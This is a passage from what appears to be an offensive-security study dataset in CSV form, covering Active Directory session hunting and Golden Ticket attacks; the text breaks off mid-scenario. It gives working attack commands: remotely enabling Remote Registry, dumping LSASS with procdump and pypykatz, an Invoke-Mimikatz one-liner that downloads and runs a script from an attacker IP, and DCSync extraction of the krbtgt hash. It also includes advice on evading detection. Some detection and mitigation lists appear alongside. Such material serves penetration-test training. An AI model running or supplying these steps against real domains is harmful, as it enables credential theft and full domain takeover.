"ad-session-enumeration","Active Directory Session Enumeration and OS Version Analysis","Enumerate active user sessions, identify where privileged accounts are logged in, and understand operating system differences that affect enumeration success rates","ACTIVE_DIRECTORY|SESSION_ENUMERATION|NETSESSIONENUM|REMOTE_REGISTRY|OS_VERSION|LATERAL_MOVEMENT|CREDENTIAL_THEFT|OSCP:HIGH","{""how_to_recognize"": [""You have domain credentials and need to find where Domain Admins are currently logged in"", ""Session enumeration commands (Get-NetSession) are failing with access denied errors"", ""Need to understand why enumeration works on some systems but not others"", ""Looking for systems where you can dump cached credentials from memory (Mimikatz, lsass)""], ""when_to_look_for"": [""After initial domain reconnaissance - before attempting lateral movement"", ""When planning credential theft attacks (need to know where admin sessions exist)"", ""When Get-NetSession fails - understand OS version limitations"", ""OSCP exam: Session enumeration success depends on target OS version (older = better success rate)""]}","[{""title"": ""Scenario 1: Understanding NetSessionEnum API Restrictions"", ""context"": ""You have domain user credentials (corp\\user) and run Get-NetSession to find where Domain Admins are logged in. On Windows Server 2016 systems you get session data, but on Windows Server 2019+ and Windows 11 systems you get 'Access Denied'. You need to understand WHY this happens and what alternatives exist."", ""approach"": ""NetSessionEnum API queries the SrvsvcSessionInfo registry key (HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity). Windows 10 build 1709, Server 2019 build 1809, and all newer versions changed permissions on this key - now only SYSTEM and Administrators can read it. Before these builds, any authenticated user could query sessions. Use OS enumeration to identify which targets will work."", ""commands"": [""powerview-get-netcomputer-os"", ""powerview-get-netcomputer-os-filter"", ""powerview-get-netsession"", ""check-netsessionenum-registry""], ""expected_outcome"": ""Get-NetComputer with operatingsystem/operatingsystemversion reveals target OS builds. Windows Server 2012 R2, 2016, Windows 7, Windows 10 (pre-1709) will allow NetSessionEnum from non-admin users. Windows Server 2019+, Windows 10 1709+, Windows 11 will deny access unless you have local admin or are SYSTEM. Focus session enumeration on older systems where it still works."", ""why_this_works"": ""NetSessionEnum API was designed for administrators to see active SMB sessions (file shares, mapped drives). Microsoft considered this information too sensitive and restricted access via registry permissions in newer OS versions. The API still exists and functions identically, but access control changed. This is security by permission, not by removing functionality. Old systems retain old permissions for compatibility - exploit this by targeting legacy systems first.""}, {""title"": ""Scenario 2: Remote Registry Session Enumeration Alternative"", ""context"": ""NetSessionEnum failed on all Windows 11 workstations. You have local admin access on several systems (found via Find-LocalAdminAccess). You need an alternative method to enumerate who's logged in - without NetSessionEnum API. Remote Registry is your option."", ""approach"": ""Use PsLoggedOn (SysInternals) or Get-NetLoggedon (PowerView). Both tools query the Remote Registry service on the target, specifically HKEY_USERS hive. Each loaded user profile = logged-on user. Remote Registry service must be running (disabled by default on Windows 8+ workstations, enabled by default on Server 2012+). If you have local admin, you can start the service remotely."", ""commands"": [""sysinternals-psloggedon"", ""powerview-get-netloggedon"", ""check-remote-registry-service"", ""enable-remote-registry"", ""query-hkey-users-remote""], ""expected_outcome"": ""PsLoggedOn \\\\TARGET returns two types of results: (1) Users logged on locally (via Remote Registry - requires local admin or service enabled), (2) Users logged on via resource shares (via NetSessionEnum - may fail on modern Windows). If Remote Registry service is disabled, start it: sc \\\\TARGET config RemoteRegistry start= demand && sc \\\\TARGET start RemoteRegistry. After service starts, PsLoggedOn succeeds and shows logged-on users: CORP\\admin (console), CORP\\user (RDP session)."", ""why_this_works"": ""Windows loads user registry hives (NTUSER.DAT) into HKEY_USERS when users log in (interactive, RDP, or RunAs). Each SID under HKEY_USERS represents an active session. Remote Registry service allows remote access to registry hives via RPC. By enumerating SIDs in HKEY_USERS, you determine who's logged in. This method bypasses NetSessionEnum restrictions but requires either local admin OR Remote Registry service explicitly enabled. Service auto-starts on connection if set to 'Manual' (default on servers).""}, {""title"": ""Scenario 3: Chained Compromise - From Session Discovery to Credential Theft"", ""context"": ""You compromised 'corp\\helpdesk' and have local admin on WORKSTATION05 (via Find-LocalAdminAccess). You enumerate sessions with Get-NetLoggedon and discover 'CORP\\DA-ADMIN' (Domain Admin) is logged in via RDP. This is your golden opportunity - compromise this machine and you get Domain Admin credentials cached in memory. But you need to maintain operational security - don't immediately pivot."", ""approach"": ""Don't immediately attack WORKSTATION05 - you'll trigger alerts. Instead: (1) Document the finding, (2) Check if DA-ADMIN session is still active (sessions expire), (3) Verify your local admin access is still valid, (4) Prepare credential dumping tools (Mimikatz, procdump + pypykatz), (5) Execute at optimal time (off-hours). The session discovery is reconnaissance - actual exploitation is a separate phase."", ""commands"": [""powerview-find-localadminaccess"", ""powerview-get-netloggedon"", ""test-admin-share-access"", ""invoke-mimikatz-remote"", ""procdump-lsass""], ""expected_outcome"": ""Find-LocalAdminAccess identifies WORKSTATION05 where you have admin rights. Get-NetLoggedon -ComputerName WORKSTATION05 reveals CORP\\DA-ADMIN logged in. You confirm access: dir \\\\WORKSTATION05\\C$ succeeds. You prepare attack: upload Mimikatz or use PsExec to run procdump.exe -accepteula -ma lsass.exe lsass.dmp. Transfer lsass.dmp to Kali, run pypykatz to extract DA-ADMIN's password/hash. You now have Domain Admin credentials - full domain compromise achieved."", ""why_this_works"": ""When users log into Windows (console, RDP, RunAs), their credentials are cached in LSASS memory for single sign-on (SSO). Domain credentials stored as: (1) plaintext passwords (WDigest - disabled by default on Win10+/2016+), (2) NTLM hashes (always present), (3) Kerberos tickets (TGT/TGS). If you have local admin on a machine where a privileged user is logged in, you can dump LSASS memory and extract these credentials. The user doesn't need to be actively using the system - as long as session exists, credentials are cached. This is by design for SSO functionality.""}, {""title"": ""Scenario 4: Operating System Enumeration for Targeted Session Hunting"", ""context"": ""Domain has 200+ computers. Running Get-NetSession against all targets would take hours and mostly fail (modern OS restrictions). You need to pre-filter targets to only attempt session enumeration on systems where it's likely to succeed - older operating systems with unrestricted NetSessionEnum."", ""approach"": ""Use Get-NetComputer with operatingsystem and operatingsystemversion filters to identify legacy systems. Target: Windows Server 2012 R2, Server 2016, Windows 7, Windows 10 versions below build 1709 (10.0.16299). Exclude: Server 2019+ (build 1809+), Windows 10 1709+, Windows 11. Build target list, then enumerate sessions only on those systems. This optimizes your time and reduces failed attempts."", ""commands"": [""powerview-get-netcomputer-os"", ""powerview-get-netcomputer-os-filter"", ""powerview-get-netsession""], ""expected_outcome"": ""Get-NetComputer -FullData | Select-Object dnshostname,operatingsystem,operatingsystemversion returns full computer list with OS details. Filter for operatingsystem like '*Server 2012*' or '*Server 2016*' or operatingsystemversion matching '10.0.14393' (Win10 1607), '10.0.15063' (Win10 1703) - pre-1709 builds. You identify 15 legacy systems. Run Get-NetSession against only these 15 targets - success rate is 80-90% vs 10-20% if you target all systems. You find 3 Domain Admin sessions across these legacy servers."", ""why_this_works"": ""Operating system version directly determines NetSessionEnum behavior. Microsoft's security update (MS KB4103727) changed SrvsvcSessionInfo registry permissions starting with Windows 10 1709 (build 16299) and Server 2019 (build 1809). Earlier versions retain the old permissive behavior. By querying operatingsystemversion from computer objects in AD, you identify targets that still allow unauthenticated NetSessionEnum queries. This is reconnaissance optimization - focus effort where success is likely.""}, {""title"": ""Scenario 5: Service Account Lateral Movement via Session Discovery"", ""context"": ""You have credentials for 'corp\\sqlservice' (Kerberoasted and cracked the password). This account has SeImpersonate privilege on SQL servers but you haven't found where it's a local admin. Session enumeration reveals sqlservice has active sessions on multiple file servers - these are your lateral movement targets. Rather than trying random PsExec, you now know WHERE sqlservice is actually used."", ""approach"": ""Run Get-NetSession or Get-NetLoggedon to find where sqlservice has active sessions. These systems are likely places where: (1) sqlservice is local admin, (2) sqlservice has scheduled tasks running, (3) sqlservice-owned processes are executing. Test local admin access on these systems first - if you have admin, you can PSExec/WinRM and get interactive access. If sqlservice isn't admin, check for running processes under this account - you can inject into those processes."", ""commands"": [""powerview-get-netsession"", ""powerview-find-localadminaccess"", ""test-admin-share-access"", ""ps-get-process-owner""], ""expected_outcome"": ""Get-NetSession shows sqlservice has sessions on FILESERVER01, FILESERVER02, DATABASE03. Test admin access: dir \\\\FILESERVER01\\C$ - success! You have local admin. Use PsExec: psexec.py corp/sqlservice:Password123@FILESERVER01 cmd. You get SYSTEM shell on FILESERVER01. Check logged-on users: query user reveals CORP\\DA-BACKUP logged in. Dump LSASS, extract DA-BACKUP credentials. You've chained from service account \u2192 lateral movement \u2192 privileged account compromise."", ""why_this_works"": ""Service accounts are designed to run services/tasks across multiple systems. Where these accounts have active sessions = where they're actually used = where they likely have elevated privileges. By correlating session data with admin access testing, you identify systems where the service account gives you foothold. This is intelligent targeting vs brute-force PSExec attempts against random systems. Sessions indicate legitimate use - you're following the same paths administrators configured.""}]","[{""title"": ""Phase 1: Operating System Enumeration"", ""notes"": ""Identify target OS versions to understand which session enumeration methods will work. Windows Server 2019+, Windows 10 1709+, and Windows 11 restrict NetSessionEnum to admins. Target older systems for unauthenticated session enumeration."", ""commands"": [{""id"": ""powerview-get-netcomputer-os"", ""example"": ""Get-NetComputer -FullData | Select-Object dnshostname, operatingsystem, operatingsystemversion"", ""shows"": ""dnshostname: Fully qualified domain name""}, {""id"": ""powerview-get-netcomputer-os-filter"", ""example"": ""Get-NetComputer -FullData | Where-Object {($_.operatingsystem -like '*Server 2012*') -or ($_.operatingsystem -like '*Server 2016*') -or (($_.operatingsystem -like '*Windows 10*') -and ([int]($_.operatingsystemversion -split '\\.')[2] -lt 16299))}"", ""shows"": ""List of legacy systems only""}]}, {""title"": ""Phase 2: NetSessionEnum-Based Session Discovery (Legacy Systems)"", ""notes"": ""Use NetSessionEnum API via Get-NetSession (PowerView) to enumerate active SMB sessions. Works on Windows Server 2016 and earlier, Windows 10 pre-1709. Returns users who have active file share connections or mapped drives. Focus on privileged accounts (Domain Admins, service accounts)."", ""commands"": [{""id"": ""powerview-get-netsession"", ""example"": ""Get-NetSession -ComputerName DC1.corp.com"", ""shows"": ""CName""}, {""id"": ""check-netsessionenum-registry"", ""example"": ""Get-Acl 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity' | Format-List"", ""shows"": ""Access control list displayed""}]}, {""title"": ""Phase 3: Remote Registry Session Discovery (Modern Systems)"", ""notes"": ""When NetSessionEnum fails (modern OS), use Remote Registry method via PsLoggedOn or Get-NetLoggedon. Requires local admin access OR Remote Registry service enabled. Queries HKEY_USERS hive to identify loaded user profiles (active sessions). More reliable than NetSessionEnum on modern Windows."", ""commands"": [{""id"": ""sysinternals-psloggedon"", ""example"": "".\\PsLoggedon.exe \\\\FILES04.corp.com"", ""shows"": ""Users logged on locally""}, {""id"": ""powerview-get-netloggedon"", ""example"": ""Get-NetLoggedon -ComputerName WEB04.corp.com"", ""shows"": ""UserName""}, {""id"": ""check-remote-registry-service"", ""example"": ""Get-Service -ComputerName WS01.corp.com -Name RemoteRegistry"", ""shows"": ""Status: Running - service active, can use Remote Registry...""}, {""id"": ""enable-remote-registry"", ""example"": ""sc.exe \\\\WORKSTATION05.corp.com config RemoteRegistry start= auto && sc.exe \\\\WORKSTATION05.corp.com start RemoteRegistry"", ""shows"": ""[SC] ChangeServiceConfig SUCCESS""}, {""id"": ""query-hkey-users-remote"", ""example"": ""reg query \\\\FILESERVER01\\HKU"", ""shows"": ""List of SIDs displayed (S-1-5-21-... format)""}]}, {""title"": ""Phase 4: Admin Access Validation"", ""notes"": ""Verify local admin access on targets where privileged sessions were discovered. Test C$ share access or use Find-LocalAdminAccess. Systems where you have admin + privileged user session = credential theft opportunity."", ""commands"": [{""id"": ""powerview-find-localadminaccess"", ""example"": ""Find-LocalAdminAccess"", ""shows"": ""Computer names where you have admin access""}, {""id"": ""test-admin-share-access"", ""example"": ""Test-Path \\\\FILESERVER01.corp.com\\C$"", ""shows"": ""True (returned) - you have local admin access""}]}, {""title"": ""Phase 5: Credential Theft Preparation"", ""notes"": ""Once target system identified (admin access + privileged session), prepare credential dumping. Use Mimikatz, procdump + pypykatz, or direct LSASS access. Don't rush - maintain operational security. Dump credentials during off-hours to avoid detection."", ""commands"": [{""id"": ""invoke-mimikatz-remote"", ""example"": ""Invoke-Command -ComputerName WORKSTATION05.corp.com -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '\""privilege::debug\"" \""sekurlsa::logonpasswords\""' }"", ""shows"": ""Hostname:""}, {""id"": ""procdump-lsass"", ""example"": ""procdump.exe -accepteula -ma lsass.exe lsass.dmp"", ""shows"": ""Dump 1 initiated""}, {""id"": ""pypykatz-parse"", ""example"": ""pypykatz lsa minidump lsass.dmp"", ""shows"": ""== LogonSession ==""}]}]"
"ad-golden-ticket-methodology","Golden Ticket Attack Methodology","Complete methodology for creating and using Kerberos Golden Tickets to achieve domain-wide persistence in Active Directory environments. Covers krbtgt hash extraction, TGT forgery, lateral movement, and operational security.","ACTIVE_DIRECTORY|GOLDEN_TICKET|KERBEROS_ATTACKS|PERSISTENCE|LATERAL_MOVEMENT|PRIVILEGE_ESCALATION|DOMAIN_DOMINANCE|MIMIKATZ|RUBEUS|DCSYNC|TICKET_FORGERY|OSCP:HIGH|POST_EXPLOITATION|WINDOWS","{""what_is_golden_ticket"": ""A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created by encrypting arbitrary authentication data with the krbtgt account's password hash. Because the krbtgt account is used by the Key Distribution Center (KDC) to sign all TGTs in the domain, possessing its hash allows an attacker to create self-signed tickets that the domain controller will trust unconditionally. Unlike Silver Tickets (which forge service tickets for specific resources), Golden Tickets grant domain-wide access to all resources."", ""how_to_recognize"": [""You have compromised a Domain Admin account or the Domain Controller itself"", ""You have successfully executed a DCSync attack and obtained password hashes"", ""You need persistent domain-wide access that survives password changes"", ""You want to access domain resources from a non-domain-joined machine"", ""You need to bypass authentication logs associated with normal user login"", ""You're performing a persistence technique after domain compromise"", ""The krbtgt account password has never been changed (check password age)"", ""You need administrative access to multiple domain systems simultaneously""], ""when_to_look_for"": [""During post-exploitation after achieving Domain Admin privileges"", ""When establishing persistence mechanisms in an Active Directory environment"", ""When you need to maintain access even if Domain Admin accounts are detected"", ""After compromising a Domain Controller and wanting to pivot without alerts"", ""When Silver Tickets are insufficient (need domain-wide access, not service-specific)"", ""During red team operations requiring long-term persistent access"", ""When you need to access resources from a workstation without domain join"", ""After obtaining the NTDS.dit database from a Domain Controller"", ""When testing detection capabilities of security monitoring solutions"", ""In OSCP lab scenarios involving Active Directory privilege escalation chains""], ""prerequisites"": [""Domain Admin privileges OR Domain Controller system access (to obtain krbtgt hash)"", ""Network access to Domain Controller (for DCSync attack)"", ""Mimikatz, Rubeus, or Impacket tools available on attacker system"", ""Knowledge of domain FQDN and ability to resolve domain hostnames"", ""Understanding of Kerberos authentication protocol and ticket structure"", ""Ability to execute commands on at least one domain-joined workstation""], ""advantages_over_silver_ticket"": [""Domain-wide access to ALL resources (Silver Ticket is service-specific)"", ""Works against any service in the domain without knowing service account hashes"", ""Ticket is signed by krbtgt, making it indistinguishable from legitimate TGTs"", ""Can be used to request service tickets (TGS) for any service via normal Kerberos"", ""Survives service account password changes (Silver Tickets are invalidated)"", ""Provides access to Domain Controllers and other high-value targets"", ""Can be created with arbitrary group memberships (Domain Admins, Enterprise Admins)"", ""Longer persistence - krbtgt password rarely changes (only on functional level upgrades)""], ""key_differences_from_silver_ticket"": [""Golden: Forges TGT (Ticket Granting Ticket) | Silver: Forges TGS (Ticket Granting Service ticket)"", ""Golden: Requires krbtgt account hash | Silver: Requires target service account hash"", ""Golden: Grants domain-wide access | Silver: Grants access to specific service only"", ""Golden: Service parameter: krbtgt/<domain> | Silver: Service parameter: <service>/<target>"", ""Golden: Can request any service ticket | Silver: Used directly for one service"", ""Golden: Extremely rare hash changes | Silver: Invalidated when service password changes"", ""Golden: Higher detection risk (domain-wide abuse) | Silver: Lower detection risk (targeted)""], ""detection_indicators"": [""Event ID 4768 (TGT Request) with unusual account name or lifetime"", ""Event ID 4769 (Service Ticket Request) using RC4 encryption (modern systems use AES)"", ""Kerberos tickets with 10-year lifetimes (default Golden Ticket expiration)"", ""TGT requests from non-domain-joined IPs or unusual geographic locations"", ""Account showing Domain Admin group membership without corresponding AD changes"", ""Kerberos authentication from accounts that should be disabled or don't exist"", ""Multiple service ticket requests in rapid succession from single account"", ""Kerberos tickets with unusual or forged SIDs in the PAC (Privilege Attribute Certificate)""], ""mitigation_and_defense"": [""Regularly rotate krbtgt account password (Microsoft recommends twice with 10-hour delay)"", ""Monitor Event IDs 4768, 4769, 4770 for anomalous Kerberos activity"", ""Alert on RC4 encryption usage (modern Windows uses AES256 by default)"", ""Implement strong privileged access workstation (PAW) controls for Domain Admins"", ""Monitor for DCSync activity (Event ID 4662 with specific replication rights)"", ""Use Microsoft ATA/Azure ATP to detect forged ticket anomalies"", ""Implement tiered administrative model to limit Domain Admin exposure"", ""Enable additional PAC validation (KB3011780) on domain controllers""]}","[{""title"": ""Scenario 1: Understanding Golden Tickets - Concept and Prerequisites"", ""context"": ""You are a penetration tester who has successfully compromised a low-privileged domain user account (corp\\jen) on a Windows workstation (CLIENT74). Through reconnaissance, you've identified that the environment is an Active Directory domain (corp.com) with a Domain Controller (DC1). You've escalated privileges and obtained local Administrator access on the workstation. Your objective is to establish persistent domain-wide access using the Golden Ticket technique. Before creating the ticket, you need to understand the attack prerequisites and the underlying Kerberos authentication mechanism."", ""objective"": ""Understand the Golden Ticket attack vector, identify prerequisites, and gather initial reconnaissance data required for the attack."", ""approach"": [""1. UNDERSTAND THE ATTACK VECTOR: Golden Tickets exploit the Kerberos authentication protocol by forging Ticket Granting Tickets (TGTs). In normal Kerberos authentication, when a user logs in, the Key Distribution Center (KDC) on the Domain Controller issues a TGT encrypted with the krbtgt account's password hash. This TGT is then used to request service tickets (TGS) for accessing domain resources. Because the krbtgt hash is the secret key for ALL TGTs, possessing it allows complete forgery."", ""2. IDENTIFY PREREQUISITES: To create a Golden Ticket, you need three pieces of information: (a) Domain FQDN (e.g., corp.com), (b) Domain SID (Security Identifier, e.g., S-1-5-21-XXX-XXX-XXX), (c) krbtgt account NTLM hash (32 hexadecimal characters). The first two can be obtained from any domain user. The third requires Domain Admin privileges or DC compromise."", ""3. RECONNAISSANCE - OBTAIN DOMAIN FQDN: From your compromised workstation as user 'jen', determine the domain FQDN. Use the systeminfo command (look for 'Domain:' field), or use nltest /dsgetdc:<domain> to query the domain. The FQDN is required for the /domain parameter when creating the ticket. Example: nltest /dsgetdc:corp.com will confirm the domain name."", ""4. RECONNAISSANCE - OBTAIN DOMAIN SID: Use the 'whoami /user' command from any domain user context. This displays the user's SID in format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-YYYY. The Domain SID is everything EXCEPT the last segment (the user RID). Example: If whoami shows 'S-1-5-21-1987370270-658905905-1781884369-1105', the Domain SID is 'S-1-5-21-1987370270-658905905-1781884369'. CRITICAL: Do NOT include the user RID (the -1105 portion)."", ""5. UNDERSTAND THE ESCALATION PATH: To obtain the krbtgt hash, you need Domain Admin privileges or direct Domain Controller access. This means Golden Ticket is a POST-EXPLOITATION persistence technique, not an initial access method. You must first compromise a Domain Admin account (via Kerberoasting, password spraying, or other privilege escalation) OR compromise the DC directly. Plan your privilege escalation path."", ""6. COMPARE WITH SILVER TICKETS: Understand why Golden Ticket is more powerful: Silver Tickets forge service tickets (TGS) for ONE specific service (e.g., CIFS/SERVER1), requiring that service's account hash. Golden Tickets forge the TGT itself, allowing access to ANY service in the domain. However, Golden Tickets require the krbtgt hash (harder to obtain) while Silver Tickets only need a service account hash (easier via Kerberoasting)."", ""7. UNDERSTAND PERSISTENCE BENEFITS: The krbtgt account password is ONLY changed during domain functional level upgrades from pre-Windows Server 2008. In mature environments, this hash may be 5-10+ years old. Once you have it, you can create Golden Tickets indefinitely, even if all Domain Admin accounts are detected and disabled. This makes it the ultimate persistence mechanism."", ""8. PLAN OPERATIONAL SECURITY: Consider detection risks. Golden Tickets with default settings create 10-year lifetime tickets (extremely suspicious). Modern SOC teams monitor for: (a) RC4 encryption (deprecated), (b) Tickets with lifetimes >24 hours, (c) Kerberos traffic from non-domain IPs, (d) Event IDs 4768 (TGT request) with unusual patterns. Plan to customize ticket parameters for realistic lifetimes and use AES encryption if possible.""], ""commands"": [], ""expected_outcome"": ""You now understand that Golden Ticket attacks require: (1) Prior privilege escalation to Domain Admin or DC compromise, (2) Three key data points: domain FQDN, domain SID, and krbtgt NTLM hash, (3) Understanding of Kerberos protocol to use tickets effectively. You've gathered the domain FQDN (corp.com) and domain SID (S-1-5-21-1987370270-658905905-1781884369) from reconnaissance. Your next step is to escalate privileges to obtain the krbtgt hash."", ""why_this_works"": ""Golden Tickets work because of a fundamental aspect of Kerberos: the krbtgt account is the trust anchor for the entire domain. Every TGT issued by the KDC is encrypted with this account's hash, and domain controllers have no way to verify if a TGT was actually issued by them or forged by an attacker - as long as the encryption is valid, the ticket is trusted. This is unlike password authentication where the DC can validate against Active Directory. With Kerberos, the ticket itself IS the authentication proof. Additionally, there's no 'ticket issuance database' tracking which tickets were legitimately issued, making forged tickets undetectable through cryptographic validation alone. Detection relies on behavioral analysis (unusual ticket properties, anomalous access patterns) rather than cryptographic verification."", ""common_mistakes"": [""Attempting Golden Ticket before obtaining Domain Admin/DC access - you need the krbtgt hash first"", ""Including the user RID in the domain SID parameter (use domain SID only, not user SID)"", ""Using IP addresses for targets instead of hostnames (forces NTLM instead of Kerberos)"", ""Assuming Golden Ticket is an initial access technique (it's post-exploitation persistence)"", ""Not understanding the difference between TGT (Golden) and TGS (Silver) tickets"", ""Forgetting that tickets must be injected into memory on the attacking workstation, not the target""], ""oscp_exam_relevance"": ""HIGH - OSCP labs frequently include Active Directory privilege escalation chains that culminate in Domain Admin access. Golden Ticket demonstrates understanding of Kerberos, post-exploitation persistence, and lateral movement. While obtaining the krbtgt hash requires prior Domain Admin access, the technique showcases complete domain compromise and is often part of full attack chain documentation in exam reports.""}, {""title"": ""Scenario 2: Obtaining krbtgt Hash via DCSync (Remote Method)"", ""context"": ""You are continuing from Scenario 1. Through a separate attack chain (e.g., Kerberoasting, AS-REP Roasting, or local privilege escalation + token impersonation), you have successfully compromised a Domain Admin account 'jeffadmin' and obtained their credentials. You are currently on the Windows workstation CLIENT74 with a command prompt running as 'corp\\jeffadmin'. The Domain Controller is DC1.corp.com (IP: 192.168.50.70). Your objective is to extract the krbtgt account's NTLM hash WITHOUT logging into the Domain Controller directly, using the DCSync attack technique."", ""objective"": ""Remotely extract the krbtgt account NTLM hash using Mimikatz's DCSync functionality, leveraging Domain Admin replication privileges."", ""approach"": [""1. UNDERSTAND DCSYNC ATTACK: DCSync is a technique that abuses the Directory Replication Service (DRS) protocol used by Domain Controllers to synchronize with each other. By default, Domain Admins, Enterprise Admins, and Domain Controllers have the 'DS-Replication-Get-Changes' and 'DS-Replication-Get-Changes-All' extended rights, allowing them to request password data from the DC. Mimikatz can impersonate a DC and request replication of any account's password hash."", ""2. VERIFY PRIVILEGES: Confirm you're running as a Domain Admin account. Use 'net user jeffadmin /domain' to display group memberships - you should see 'Domain Admins' listed. Alternatively, use 'whoami /groups' and look for 'CORP\\Domain Admins' with attributes 'Mandatory group, Enabled by default, Enabled group'. Without these privileges, DCSync will fail with ERROR 0x00002105 (access denied)."", ""3. VERIFY DOMAIN CONTROLLER CONNECTIVITY: Ensure network connectivity to the DC and that DNS resolution works. Use 'nltest /dsgetdc:corp.com' to locate the DC. Use 'ping DC1.corp.com' to verify reachability. DCSync requires RPC connectivity (TCP 135, 445, and dynamic high ports 49152-65535). Firewall blocks will cause 'RPC server unavailable' errors."", ""4. LAUNCH MIMIKATZ: From C:\\Tools on CLIENT74, run mimikatz.exe. You should see the Mimikatz banner and 'mimikatz #' prompt. Mimikatz doesn't require installation - it's a standalone executable. For OPSEC, consider running from a memory-only location or using Invoke-Mimikatz PowerShell wrapper to avoid disk artifacts."", ""5. OBTAIN DEBUG PRIVILEGES: Run 'privilege::debug' to enable SeDebugPrivilege. This is required for many Mimikatz operations (though DCSync doesn't strictly need it, it's good practice). You should see 'Privilege '20' OK'. If you see an error, you're not running as Administrator. DCSync itself only requires domain replication rights, not local admin, but other Mimikatz functions need debug privilege."", ""6. EXECUTE DCSYNC ATTACK: Run the command 'lsadump::dcsync /domain:corp.com /user:krbtgt'. The /domain parameter specifies the target AD domain (use FQDN). The /user parameter specifies which account to extract - we want 'krbtgt'. Mimikatz will connect to the DC via RPC and request replication data for this account."", ""7. PARSE THE OUTPUT: DCSync output contains multiple fields. Look for these key pieces: (a) 'Domain : CORP / S-1-5-21-...' - confirms domain and shows domain SID, (b) 'RID  : 000001f6 (502)' - krbtgt's well-known RID is 502, (c) 'User : krbtgt' - confirms target account, (d) 'NTLM : [32-character hexadecimal hash]' - THIS IS THE GOLDEN TICKET KEY. Example: NTLM : 1693c6cefafffc7af11ef34d1c788f47."", ""8. SAVE THE KRBTGT HASH: IMMEDIATELY copy the NTLM hash to a secure note. This hash is the most sensitive credential in the domain - with it, you have permanent domain-wide access. Format: Exactly 32 hexadecimal characters (0-9, a-f). Do not include spaces, colons, or 'NTLM :' prefix. Example: 1693c6cefafffc7af11ef34d1c788f47."", ""9. OPTIONAL - EXTRACT AES KEYS: For improved OPSEC, also save the AES256 key from DCSync output (look for 'aes256_hmac'). AES encryption is less suspicious than RC4 (NTLM). However, Rubeus is required to use AES keys (Mimikatz golden ticket defaults to RC4). AES keys are 64 hexadecimal characters."", ""10. OPERATIONAL SECURITY: DCSync generates Event ID 4662 on the Domain Controller (An operation was performed on an object) with specific replication GUID. Advanced SOC teams monitor for DCSync. To reduce detection: (a) Perform during business hours (blend with legitimate DC-to-DC replication), (b) Extract only krbtgt, not all users (bulk extraction is more obvious), (c) Use a compromised service account with replication rights if available (less suspicious than Domain Admin account)."", ""11. VERIFY HASH INTEGRITY: The hash should be exactly 32 hex characters. Common mistakes: Including spaces, copying 'NTLM :' prefix, confusing with LM hash (older format, usually empty). Test the hash format with a regex: ^[a-f0-9]{32}$ (should match). If length is wrong, re-run DCSync and carefully copy ONLY the hash portion."", ""12. ALTERNATIVE - EXTRACT ALL DOMAIN HASHES: If you want comprehensive persistence, use 'lsadump::dcsync /domain:corp.com /all /csv' to dump ALL domain account hashes to CSV format. This takes longer and is noisier, but provides password hashes for every domain user and computer account. Useful for offline password cracking and creating multiple persistence mechanisms.""], ""commands"": [""ad-golden-ticket-dcsync-krbtgt""], ""expected_outcome"": ""You successfully extract the krbtgt account NTLM hash using DCSync without touching the Domain Controller's file system or memory directly. Output shows: Domain SID (S-1-5-21-1987370270-658905905-1781884369), krbtgt RID (502), and NTLM hash (1693c6cefafffc7af11ef34d1c788f47). You now have the key piece of data needed for Golden Ticket creation. No alerts are triggered (unless advanced monitoring is in place). The entire operation takes 10-30 seconds."", ""why_this_works"": ""DCSync works because it exploits LEGITIMATE Active Directory functionality. Domain Controllers must replicate password hashes between each other for authentication to work across multiple DCs. The replication protocol (MS-DRSR) has no way to distinguish between a real DC requesting replication and an attacker with replication privileges requesting the same data. Active Directory doesn't log or alert on replication requests by default because they're considered normal operations. The attack succeeds with only Domain Admin credentials - no exploitation, no malware, just abuse of intended functionality. This is why DCSync is so effective and difficult to prevent without behavioral monitoring."", ""common_mistakes"": [""Forgetting to specify /domain parameter (causes 'domain not found' error)"", ""Using NetBIOS name instead of FQDN for domain (use 'corp.com' not 'CORP')"", ""Running DCSync without Domain Admin privileges (ERROR 0x00002105)"", ""Network/firewall blocking RPC to DC (ERROR 'RPC server unavailable')"", ""Copying the wrong hash - LM hash field is usually empty, NTLM hash is the important one"", ""Including spaces or 'NTLM :' prefix when saving the hash"", ""Running from a non-domain-authenticated session (use runas /netonly if needed)""], ""oscp_exam_relevance"": ""HIGH - DCSync is a core post-exploitation technique in Active Directory environments. It demonstrates understanding of domain replication, privilege abuse, and stealth techniques. OSCP labs include scenarios where DCSync is necessary to extract credentials for lateral movement or persistence. Knowing both DCSync and Golden Ticket creates a complete attack narrative for exam documentation.""}, {""title"": ""Scenario 3: Obtaining krbtgt Hash via LSA Dump (Domain Controller Access Method)"", ""context"": ""ALTERNATIVE to Scenario 2. You have successfully compromised the Domain Controller DC1 directly (e.g., through exploitation of a vulnerable service, stolen RDP credentials, or physical access). You have remote desktop access to the DC as a local administrator account 'jeffadmin'. DCSync is not necessary because you have direct access to the DC's memory and registry. Your objective is to extract the krbtgt hash directly from the DC's Local Security Authority (LSA) using Mimikatz, which dumps credential material from the LSASS process."", ""objective"": ""Extract the krbtgt account NTLM hash directly from the Domain Controller's memory using LSA dump technique."", ""approach"": [""1. UNDERSTAND LSA DUMP: The Local Security Authority (LSA) is a protected Windows subsystem that handles authentication and stores sensitive security information in memory. On a Domain Controller, LSA caches password hashes for all domain accounts, including krbtgt. Mimikatz's 'lsadump::lsa' module dumps these cached secrets from the LSASS.exe process memory. Unlike DCSync (which uses network replication), this is direct memory access requiring local admin on the DC."", ""2. VERIFY DC ACCESS: Confirm you're logged into the Domain Controller (not just a domain-joined workstation). Run 'hostname' - it should show 'DC1'. Run 'systeminfo' and look for 'Domain Role: Primary Domain Controller' or 'Backup Domain Controller'. If the domain role is 'Member Server' or 'Workstation', you're on the wrong machine - LSA dump on a non-DC will only show local SAM hashes, not domain hashes."", ""3. VERIFY LOCAL ADMIN PRIVILEGES: LSA dump requires local Administrator rights on the DC. Run 'net localgroup Administrators' - your account should be listed. Note that Domain Admin automatically grants local admin on DCs, but verify anyway. If you only have domain user access, escalate privileges first."", ""4. OBTAIN SYSTEM PRIVILEGES: For maximum reliability, run Mimikatz as SYSTEM (not just Administrator). Use PsExec: 'PsExec.exe -s -i cmd.exe' to launch a command prompt as SYSTEM. From that prompt, run mimikatz.exe. WHY SYSTEM: Some LSA protections require SYSTEM context. Running as admin might work, 